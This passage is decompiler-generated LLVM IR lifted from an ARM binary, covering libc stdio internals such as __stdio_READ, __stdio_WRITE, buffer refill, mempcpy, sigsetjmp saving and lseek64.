; uselistorder directives
  uselistorder i32 %v0_18ee0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18ee8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18e14, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 12, 13, 0, 3, 14, 4, 15, 16, 9, 10, 11, 17, 5, 6, 7, 8, 1, 18, 2, 19 }
  uselistorder i32 18, { 10, 11, 8, 12, 9, 0, 1, 2, 3, 13, 4, 14, 5, 15, 6, 16, 7, 17 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 10, 13, 14, 7, 15, 8, 16, 9, 17 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_18f28, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18f10, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18f40 = load i32, i32* @r4, align 4
  store i32 %v3_18f40, i32* %stack_var_-12, align 4
  %v0_18f44 = load i32, i32* %r0.global-to-local, align 4
  %v1_18f44 = inttoptr i32 %v0_18f44 to i16*
  %v2_18f44 = load i16, i16* %v1_18f44, align 2
  %v3_18f44 = zext i16 %v2_18f44 to i32
  store i32 %v3_18f44, i32* @r3, align 4
  %v1_18f48 = and i32 %v3_18f44, 4
  store i32 %v1_18f48, i32* @r5, align 4
  %v2_18f48 = icmp eq i32 %v1_18f48, 0
  store i32 %v0_18f44, i32* @r4, align 4
  br i1 %v2_18f48, label %dec_label_pc_18f5c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_18f5c:                               ; preds = %entry
  %v1_18f5c = icmp slt i32 %arg2, 0
  br i1 %v1_18f5c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_18f5c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_18f5c, %bb18
  %v1_18f64 = add i32 %v0_18f44, 4
  %v2_18f64 = inttoptr i32 %v1_18f64 to i32*
  %v3_18f64 = load i32, i32* %v2_18f64, align 4
  store i32 %v3_18f64, i32* %r0.global-to-local, align 4
  %v1_18f68 = call i32 @__libc_read(i32 %v3_18f64)
  store i32 %v1_18f68, i32* %r0.global-to-local, align 4
  %v5_18f70 = icmp sgt i32 %v1_18f68, 0
  br i1 %v5_18f70, label %.thread7, label %dec_label_pc_18f74

dec_label_pc_18f74:                               ; preds = %bb19
  %v2_18f6c = icmp eq i32 %v1_18f68, 0
  %v0_18f74 = load i32, i32* @r4, align 4
  %v1_18f74 = inttoptr i32 %v0_18f74 to i16*
  %v2_18f74 = load i16, i16* %v1_18f74, align 2
  br i1 %v2_18f6c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18f74
  %v2_18f78 = or i16 %v2_18f74, 4
  store i16 %v2_18f78, i16* %v1_18f74, align 2
  %v1_18f94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18f74
  %v2_18f7c = or i16 %v2_18f74, 8
  store i16 %v2_18f7c, i16* %v1_18f74, align 2
  %v1_18f88 = load i32, i32* @r5, align 4
  store i32 %v1_18f88, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_18f94 = phi i32 [ %v1_18f94.pre, %bb20 ], [ 0, %bb ], [ %v1_18f68, %bb19 ], [ %v1_18f88, %bb21 ]
  %v2_18f90 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18f90, i32* @r4, align 4
  ret i32 %v1_18f94

; uselistorder directives
  uselistorder i16 %v2_18f74, { 1, 0 }
  uselistorder i32 %v1_18f68, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1905c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1905c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1905c2, label %dec_label_pc_19064, label %dec_label_pc_18fb4

dec_label_pc_18fb4:                               ; preds = %entry, %dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge
  %v0_18fc0 = phi i32 [ %v0_18fc0.pre, %dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge ], [ %tmp, %entry ]
  %v0_18fbc = phi i32 [ %v5_18fcc, %dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge ], [ %arg2, %entry ]
  %v3_18fb4 = phi i32 [ %v3_18fb4.pre, %dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge ], [ 2147483647, %entry ]
  %v0_18fb8.in = phi i32 [ %v5_18fd0, %dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge ], [ %arg3, %entry ]
  %v3_18fb8 = phi i32 [ %v5_18fd0, %dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge ], [ %arg3, %entry ]
  %v0_18fb8 = icmp slt i32 %v0_18fb8.in, 0
  %storemerge = select i1 %v0_18fb8, i32 %v3_18fb4, i32 %v3_18fb8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_18fbc, i32* %r1.global-to-local, align 4
  %v1_18fc0 = add i32 %v0_18fc0, 4
  %v2_18fc0 = inttoptr i32 %v1_18fc0 to i32*
  %v3_18fc0 = load i32, i32* %v2_18fc0, align 4
  %tmp21 = inttoptr i32 %v0_18fbc to i64*
  %v4_18fc4 = call i32 @__GI___libc_write(i32 %v3_18fc0, i64* %tmp21)
  %v1_18fc8 = icmp slt i32 %v4_18fc4, 0
  %v2_18fc8 = icmp eq i32 %v4_18fc4, 0
  store i1 %v2_18fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18fc8, label %dec_label_pc_18fd8, label %dec_label_pc_1905cthread-pre-split

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18fb4
  %v0_18fd8 = load i32, i32* @r4, align 4
  %v1_18fd8 = inttoptr i32 %v0_18fd8 to i16*
  %v2_18fd8 = load i16, i16* %v1_18fd8, align 2
  %v1_18fdc = or i16 %v2_18fd8, 8
  store i16 %v1_18fdc, i16* %v1_18fd8, align 2
  store i32 41076, i32* %r3.global-to-local, align 4
  %v0_18fe8 = call i32 @__aeabi_read_tp()
  %v3_18fec = load i16, i16* @global_var_23068.362, align 2
  %v4_18fec = sext i16 %v3_18fec to i32
  store i32 %v4_18fec, i32* %r3.global-to-local, align 4
  %v2_18ff0 = add i32 %v4_18fec, %v0_18fe8
  %v3_18ff0 = inttoptr i32 %v2_18ff0 to i32*
  %v4_18ff0 = load i32, i32* %v3_18ff0, align 4
  store i32 %v4_18ff0, i32* %r3.global-to-local, align 4
  %v7_18ff4 = icmp eq i32 %v4_18ff0, 4
  store i1 %v7_18ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ff4, label %dec_label_pc_19000, label %bb22

bb22:                                             ; preds = %dec_label_pc_18fd8
  %v8_18ff8 = icmp eq i32 %v4_18ff0, 11
  store i1 %v8_18ff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18ff8, label %dec_label_pc_19000, label %dec_label_pc_19064

dec_label_pc_19000:                               ; preds = %dec_label_pc_18fd8, %bb22
  %v0_19000 = load i32, i32* @r4, align 4
  %v1_19000 = add i32 %v0_19000, 8
  store i32 %v1_19000, i32* %r2.global-to-local, align 4
  %v1_19004 = inttoptr i32 %v1_19000 to i32*
  %v2_19004 = load i32, i32* %v1_19004, align 4
  store i32 %v2_19004, i32* %r2.global-to-local, align 4
  %v3_19004 = add i32 %v0_19000, 12
  %v4_19004 = inttoptr i32 %v3_19004 to i32*
  %v5_19004 = load i32, i32* %v4_19004, align 4
  store i32 %v5_19004, i32* %r3.global-to-local, align 4
  %v2_19008 = sub i32 %v5_19004, %v2_19004
  store i32 %v2_19008, i32* %r1.global-to-local, align 4
  %v9_19008 = icmp eq i32 %v5_19004, %v2_19004
  store i1 %v9_19008, i1* %cpsr_z.global-to-local, align 1
  %v0_19054.pre = load i32, i32* @r5, align 4
  br i1 %v9_19008, label %dec_label_pc_19054, label %dec_label_pc_19010

dec_label_pc_19010:                               ; preds = %dec_label_pc_19000
  %v3_19010 = icmp ult i32 %v2_19008, %v0_19054.pre
  %v9_19010 = icmp eq i32 %v2_19008, %v0_19054.pre
  store i1 %v9_19010, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19010, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_19010
  store i32 %v0_19054.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19010, %bb23, %dec_label_pc_19038
  %v2_19024 = phi i32 [ %v1_1903c, %dec_label_pc_19038 ], [ %v2_19004, %bb23 ], [ %v2_19004, %dec_label_pc_19010 ]
  %v0_19018 = load i32, i32* @r6, align 4
  %v1_19018 = inttoptr i32 %v0_19018 to i8*
  %v2_19018 = load i8, i8* %v1_19018, align 1
  %v3_19018 = zext i8 %v2_19018 to i32
  store i32 %v3_19018, i32* %r3.global-to-local, align 4
  %v7_1901c = icmp eq i8 %v2_19018, 10
  store i1 %v7_1901c, i1* %cpsr_z.global-to-local, align 1
  %v1_19020 = add i32 %v0_19018, 1
  store i32 %v1_19020, i32* @r6, align 4
  %v3_19024 = inttoptr i32 %v2_19024 to i8*
  store i8 %v2_19018, i8* %v3_19024, align 1
  %v0_19028 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19028, label %dec_label_pc_1902c, label %dec_label_pc_19038

dec_label_pc_1902c:                               ; preds = %.preheader
  %v0_1902c = load i32, i32* @r4, align 4
  %v1_1902c = inttoptr i32 %v0_1902c to i16*
  %v2_1902c = load i16, i16* %v1_1902c, align 2
  %v3_1902c = zext i16 %v2_1902c to i32
  store i32 %v3_1902c, i32* %r3.global-to-local, align 4
  %v1_19030 = and i32 %v3_1902c, 256
  %v2_19030 = icmp eq i32 %v1_19030, 0
  store i1 %v2_19030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19030, label %dec_label_pc_19038, label %dec_label_pc_1902c.dec_label_pc_19044_crit_edge

dec_label_pc_1902c.dec_label_pc_19044_crit_edge:  ; preds = %dec_label_pc_1902c
  %v0_19048.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19044

dec_label_pc_19038:                               ; preds = %dec_label_pc_1902c, %.preheader
  %v0_19038 = load i32, i32* %r1.global-to-local, align 4
  %v1_19038 = add i32 %v0_19038, -1
  store i32 %v1_19038, i32* %r1.global-to-local, align 4
  %v7_19038 = icmp eq i32 %v0_19038, 1
  store i1 %v7_19038, i1* %cpsr_z.global-to-local, align 1
  %v0_1903c = load i32, i32* %r2.global-to-local, align 4
  %v1_1903c = add i32 %v0_1903c, 1
  store i32 %v1_1903c, i32* %r2.global-to-local, align 4
  br i1 %v7_19038, label %dec_label_pc_19038.dec_label_pc_19044_crit_edge, label %.preheader

dec_label_pc_19038.dec_label_pc_19044_crit_edge:  ; preds = %dec_label_pc_19038
  %v0_19044.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19044

dec_label_pc_19044:                               ; preds = %dec_label_pc_1902c.dec_label_pc_19044_crit_edge, %dec_label_pc_19038.dec_label_pc_19044_crit_edge
  %v0_19048 = phi i32 [ %v1_1903c, %dec_label_pc_19038.dec_label_pc_19044_crit_edge ], [ %v0_19048.pre, %dec_label_pc_1902c.dec_label_pc_19044_crit_edge ]
  %v0_19044 = phi i32 [ %v0_19044.pre, %dec_label_pc_19038.dec_label_pc_19044_crit_edge ], [ %v0_1902c, %dec_label_pc_1902c.dec_label_pc_19044_crit_edge ]
  %v1_19044 = add i32 %v0_19044, 8
  %v2_19044 = inttoptr i32 %v1_19044 to i32*
  %v3_19044 = load i32, i32* %v2_19044, align 4
  store i32 %v3_19044, i32* %r3.global-to-local, align 4
  %v2_19048 = add i32 %v0_19044, 16
  %v3_19048 = inttoptr i32 %v2_19048 to i32*
  store i32 %v0_19048, i32* %v3_19048, align 4
  %v0_1904c = load i32, i32* %r3.global-to-local, align 4
  %v1_1904c = load i32, i32* %r2.global-to-local, align 4
  %v2_1904c = sub i32 %v1_1904c, %v0_1904c
  store i32 %v2_1904c, i32* %r3.global-to-local, align 4
  %v1_19050 = load i32, i32* @r5, align 4
  %v2_19050 = sub i32 %v1_19050, %v2_1904c
  br label %dec_label_pc_19054

dec_label_pc_19054:                               ; preds = %dec_label_pc_19000, %dec_label_pc_19044
  %v0_19054 = phi i32 [ %v2_19050, %dec_label_pc_19044 ], [ %v0_19054.pre, %dec_label_pc_19000 ]
  %v1_19054 = load i32, i32* @r7, align 4
  %v2_19054 = sub i32 %v1_19054, %v0_19054
  store i32 %v2_19054, i32* @r7, align 4
  br label %dec_label_pc_19064

dec_label_pc_1905cthread-pre-split:               ; preds = %dec_label_pc_18fb4
  %v3_18fcc = load i32, i32* @r6, align 4
  %v5_18fcc = add i32 %v3_18fcc, %v4_18fc4
  store i32 %v5_18fcc, i32* @r6, align 4
  %v4_18fd0 = load i32, i32* @r5, align 4
  %v5_18fd0 = sub i32 %v4_18fd0, %v4_18fc4
  store i32 %v5_18fd0, i32* @r5, align 4
  %v2_1905c = icmp eq i32 %v5_18fd0, 0
  store i1 %v2_1905c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1905c, label %dec_label_pc_19064, label %dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge

dec_label_pc_1905cthread-pre-split.dec_label_pc_18fb4_crit_edge: ; preds = %dec_label_pc_1905cthread-pre-split
  %v3_18fb4.pre = load i32, i32* @r8, align 4
  %v0_18fc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18fb4

dec_label_pc_19064:                               ; preds = %dec_label_pc_1905cthread-pre-split, %entry, %bb22, %dec_label_pc_19054
  %v0_19064 = load i32, i32* @r7, align 4
  ret i32 %v0_19064

; uselistorder directives
  uselistorder i32 %v5_18fd0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_18fcc, { 1, 0 }
  uselistorder i32 %v0_19044, { 1, 0 }
  uselistorder i32 %v1_1903c, { 0, 2, 1 }
  uselistorder i32 %v0_19038, { 1, 0 }
  uselistorder i32 %v0_19054.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_19004, { 1, 0, 2 }
  uselistorder i32 %v2_19004, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v4_18fc4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18fbc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 9, 5, 6, 7, 17, 24, 25, 10, 11, 12, 8, 13, 2, 14, 15, 16, 18, 19, 3, 20, 4, 21, 0, 22, 1, 23, 26 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19064, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_19054, { 1, 0 }
  uselistorder label %dec_label_pc_19044, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19000, { 1, 0 }
  uselistorder label %dec_label_pc_18fb4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19074 = load i32, i32* @r4, align 4
  store i32 %v3_19074, i32* %stack_var_-8, align 4
  %v1_19078 = add i32 %arg1, 8
  %v1_1907c = inttoptr i32 %v1_19078 to i32*
  %v2_1907c = load i32, i32* %v1_1907c, align 4
  store i32 %v2_1907c, i32* @r1, align 4
  %v3_1907c = add i32 %arg1, 12
  %v4_1907c = inttoptr i32 %v3_1907c to i32*
  %v5_1907c = load i32, i32* %v4_1907c, align 4
  %v2_19080 = sub i32 %v5_1907c, %v2_1907c
  store i32 %v2_19080, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19088 = inttoptr i32 %arg1 to i16*
  %v4_19088 = call i32 @__stdio_READ(i16* %v3_19088, i32 %v2_1907c, i32 %v2_19080)
  %v0_1908c = load i32, i32* @r4, align 4
  %v1_1908c = add i32 %v0_1908c, 8
  %v2_1908c = inttoptr i32 %v1_1908c to i32*
  %v3_1908c = load i32, i32* %v2_1908c, align 4
  store i32 %v3_1908c, i32* %r2.global-to-local, align 4
  %v2_19090 = add i32 %v3_1908c, %v4_19088
  %v2_19094 = add i32 %v0_1908c, 20
  %v3_19094 = inttoptr i32 %v2_19094 to i32*
  store i32 %v2_19090, i32* %v3_19094, align 4
  %v0_19098 = load i32, i32* %r2.global-to-local, align 4
  %v1_19098 = load i32, i32* @r4, align 4
  %v2_19098 = add i32 %v1_19098, 16
  %v3_19098 = inttoptr i32 %v2_19098 to i32*
  store i32 %v0_19098, i32* %v3_19098, align 4
  %v2_1909c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1909c, i32* @r4, align 4
  ret i32 %v4_19088

; uselistorder directives
  uselistorder i32 %v4_19088, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_190a4 = load i32, i32* @r4, align 4
  store i32 %v3_190a4, i32* %stack_var_-12, align 4
  %v0_190a8 = load i32, i32* @r0, align 4
  %v1_190a8 = inttoptr i32 %v0_190a8 to i16*
  %v2_190a8 = load i16, i16* %v1_190a8, align 2
  %v3_190a8 = zext i16 %v2_190a8 to i32
  store i32 %v3_190a8, i32* %r3.global-to-local, align 4
  %v0_190ac = load i32, i32* @r1, align 4
  %v2_190ac = and i32 %v0_190ac, %v3_190a8
  %v4_190ac = icmp eq i32 %v2_190ac, 0
  store i32 %v0_190a8, i32* @r4, align 4
  br i1 %v4_190ac, label %dec_label_pc_190bc, label %dec_label_pc_190cc

dec_label_pc_190bc:                               ; preds = %entry
  %v1_190bc = and i32 %v3_190a8, 2176
  %v2_190bc = icmp eq i32 %v1_190bc, 0
  br i1 %v2_190bc, label %dec_label_pc_190c4, label %dec_label_pc_190d8

dec_label_pc_190c4:                               ; preds = %dec_label_pc_190bc
  %v2_190c4 = or i32 %v0_190ac, %v3_190a8
  store i32 %v2_190c4, i32* %r3.global-to-local, align 4
  %v1_190c8 = trunc i32 %v2_190c4 to i16
  store i16 %v1_190c8, i16* %v1_190a8, align 2
  %v0_190cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_190cc

dec_label_pc_190cc:                               ; preds = %entry, %dec_label_pc_190c4
  %v0_190cc = phi i32 [ %v0_190a8, %entry ], [ %v0_190cc.pre, %dec_label_pc_190c4 ]
  %v1_190cc = inttoptr i32 %v0_190cc to i16*
  %v2_190cc = load i16, i16* %v1_190cc, align 2
  %v3_190cc = zext i16 %v2_190cc to i32
  store i32 %v3_190cc, i32* %r3.global-to-local, align 4
  %v1_190d0 = and i32 %v3_190cc, 16
  store i32 %v1_190d0, i32* %r5.global-to-local, align 4
  %v2_190d0 = icmp eq i32 %v1_190d0, 0
  br i1 %v2_190d0, label %dec_label_pc_19100, label %dec_label_pc_190d8

dec_label_pc_190d8:                               ; preds = %dec_label_pc_190bc, %dec_label_pc_190cc
  store i32 40832, i32* %r3.global-to-local, align 4
  %v0_190dc = call i32 @__aeabi_read_tp()
  store i32 %v0_190dc, i32* %r0.global-to-local, align 4
  %v3_190e0 = load i16, i16* @global_var_23068.362, align 2
  %v4_190e0 = sext i16 %v3_190e0 to i32
  store i32 %v4_190e0, i32* %r3.global-to-local, align 4
  %v3_190e8 = add i32 %v4_190e0, %v0_190dc
  %v4_190e8 = inttoptr i32 %v3_190e8 to i32*
  store i32 9, i32* %v4_190e8, align 4
  br label %dec_label_pc_190ec

dec_label_pc_190ec:                               ; preds = %dec_label_pc_19108, %dec_label_pc_190d8
  %v0_190ec = load i32, i32* @r4, align 4
  %v1_190ec = inttoptr i32 %v0_190ec to i16*
  %v2_190ec = load i16, i16* %v1_190ec, align 2
  %v3_190ec = zext i16 %v2_190ec to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_190f4 = or i32 %v3_190ec, 8
  store i32 %v1_190f4, i32* %r3.global-to-local, align 4
  %v1_190f8 = trunc i32 %v1_190f4 to i16
  store i16 %v1_190f8, i16* %v1_190ec, align 2
  %v1_19140.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19138

dec_label_pc_19100:                               ; preds = %dec_label_pc_190cc
  %v1_19100 = and i32 %v3_190cc, 64
  %v2_19100 = icmp eq i32 %v1_19100, 0
  br i1 %v2_19100, label %dec_label_pc_19128, label %dec_label_pc_19108

dec_label_pc_19108:                               ; preds = %dec_label_pc_19100
  %v0_19108 = load i32, i32* @r0, align 4
  %v1_19108 = call i32 @__stdio_wcommit(i32 %v0_19108)
  store i32 %v1_19108, i32* %r0.global-to-local, align 4
  %v2_1910c = icmp eq i32 %v1_19108, 0
  br i1 %v2_1910c, label %dec_label_pc_19114, label %dec_label_pc_190ec

dec_label_pc_19114:                               ; preds = %dec_label_pc_19108
  %v0_19114 = load i32, i32* @r4, align 4
  %v1_19114 = inttoptr i32 %v0_19114 to i16*
  %v2_19114 = load i16, i16* %v1_19114, align 2
  %v3_19114 = zext i16 %v2_19114 to i32
  store i32 %v3_19114, i32* %r3.global-to-local, align 4
  %v1_19118 = add i32 %v0_19114, 8
  %v2_19118 = inttoptr i32 %v1_19118 to i32*
  %v3_19118 = load i32, i32* %v2_19118, align 4
  %v1_1911c = and i32 %v3_19114, 65471
  store i32 %v1_1911c, i32* %r3.global-to-local, align 4
  %v2_19120 = add i32 %v0_19114, 28
  %v3_19120 = inttoptr i32 %v2_19120 to i32*
  store i32 %v3_19118, i32* %v3_19120, align 4
  %v0_19124 = load i32, i32* %r3.global-to-local, align 4
  %v1_19124 = trunc i32 %v0_19124 to i16
  %v2_19124 = load i32, i32* @r4, align 4
  %v3_19124 = inttoptr i32 %v2_19124 to i16*
  store i16 %v1_19124, i16* %v3_19124, align 2
  %v0_19128.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19128

dec_label_pc_19128:                               ; preds = %dec_label_pc_19100, %dec_label_pc_19114
  %v2_19130 = phi i32 [ %v0_190cc, %dec_label_pc_19100 ], [ %v0_19128.pre, %dec_label_pc_19114 ]
  %v1_19128 = inttoptr i32 %v2_19130 to i16*
  %v2_19128 = load i16, i16* %v1_19128, align 2
  %v3_19128 = zext i16 %v2_19128 to i32
  %v1_1912c = or i32 %v3_19128, 1
  store i32 %v1_1912c, i32* %r3.global-to-local, align 4
  %v1_19130 = trunc i32 %v1_1912c to i16
  store i16 %v1_19130, i16* %v1_19128, align 2
  %v0_19134 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19138

dec_label_pc_19138:                               ; preds = %dec_label_pc_190ec, %dec_label_pc_19128
  %v1_19140 = phi i32 [ %v1_19140.pre, %dec_label_pc_190ec ], [ %v0_19134, %dec_label_pc_19128 ]
  %v2_1913c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1913c, i32* @r4, align 4
  ret i32 %v1_19140

; uselistorder directives
  uselistorder i32 %v3_190a8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19138, { 1, 0 }
  uselistorder label %dec_label_pc_19128, { 1, 0 }
  uselistorder label %dec_label_pc_190d8, { 1, 0 }
  uselistorder label %dec_label_pc_190cc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_19148 = load i32, i32* @r4, align 4
  %v6_19148 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19158 = call i32 @memcpy()
  %v0_1915c = load i32, i32* @r5, align 4
  %v1_1915c = load i32, i32* @r4, align 4
  %v2_1915c = add i32 %v1_1915c, %v0_1915c
  store i32 %v3_19148, i32* @r4, align 4
  store i32 %v6_19148, i32* @r5, align 4
  ret i32 %v2_1915c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1916c = load i32, i32* @r1, align 4
  %v2_1916c = icmp eq i32 %v0_1916c, 0
  %v3_19170 = load i32, i32* @r4, align 4
  store i32 %v3_19170, i32* %stack_var_-8, align 4
  %v0_19174 = load i32, i32* @r0, align 4
  store i32 %v0_19174, i32* %r4.global-to-local, align 4
  br i1 %v2_1916c, label %dec_label_pc_19198, label %dec_label_pc_1917c

dec_label_pc_1917c:                               ; preds = %entry
  %v1_19184 = add i32 %v0_19174, 260
  %v4_19188 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_19184)
  %v2_1918c = icmp eq i32 %v4_19188, 0
  br i1 %v2_1918c, label %dec_label_pc_1919c, label %dec_label_pc_19198

dec_label_pc_19198:                               ; preds = %dec_label_pc_1917c, %entry
  br label %dec_label_pc_1919c

dec_label_pc_1919c:                               ; preds = %dec_label_pc_1917c, %dec_label_pc_19198
  %storemerge = phi i32 [ 0, %dec_label_pc_19198 ], [ 1, %dec_label_pc_1917c ]
  %v1_191a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_191a0 = add i32 %v1_191a0, 256
  %v3_191a0 = inttoptr i32 %v2_191a0 to i32*
  store i32 %storemerge, i32* %v3_191a0, align 4
  %v2_191a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_191a4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 3, 21, 4, 22, 23, 24 }
  uselistorder label %dec_label_pc_1919c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_191f4, label %dec_label_pc_191d8

dec_label_pc_191d8:                               ; preds = %entry
  %v0_191dc = call i32 @__aeabi_read_tp()
  %v3_191e0 = load i16, i16* @global_var_23068.362, align 2
  %v4_191e0 = sext i16 %v3_191e0 to i32
  %v0_191e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_191e4 = sub i32 0, %v0_191e4
  store i32 %v1_191e4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_191ec = add i32 %v4_191e0, %v0_191dc
  %v4_191ec = inttoptr i32 %v3_191ec to i32*
  store i32 %v1_191e4, i32* %v4_191ec, align 4
  %v0_191fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_191fc

dec_label_pc_191f4:                               ; preds = %entry
